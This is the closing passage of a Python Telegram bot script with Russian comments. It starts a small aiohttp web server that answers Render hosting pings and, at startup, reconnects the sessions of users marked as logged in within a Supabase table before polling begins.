    await edit_or_send(cb.from_user.id, text, reply_markup=builder.as_markup(), parse_mode="Markdown")


# === RENDER WEB-SERVICE FIX ===
async def web_handler(request):
    """
    Отвечает на пинги Render, чтобы не отключались порты.
    """
    return web.Response(text="Сервак та работает гений :0")

async def start_web_server():
    app = web.Application()
    app.router.add_get('/', web_handler)
    runner = web.AppRunner(app)
    await runner.setup()
    
    # Render автоматически задает переменную PORT для веб-сервисов
    port = int(os.environ.get("PORT", 8080))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    print(f"🌐 [Web] Сервер запущен на порту {port}")

# === АВТОМАТИЧЕСКИЙ ВОССТАНОВИТЕЛЬ ПРИ РЕСТАРТЕ RENDER ===
async def on_startup():
    print("🚀 Бот запущен. Восстановление активных сессий из Supabase...")
    await start_web_server()  # Запускаем web-сервер параллельно
    try:
        res = supabase.table("user_configs").select("user_id").eq("logged_in", True).execute()
        if res.data:
            for row in res.data:
                uid = row["user_id"]
                print(f"🔄 Подключение сессии user_id: {uid}")
                await ensure_client_connected(uid)
    except Exception as e:
        print(f"⚠️ Ошибка при авто-восстановлении: {e}")

if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    loop.create_task(on_startup())
    loop.run_until_complete(dp.start_polling(bot))
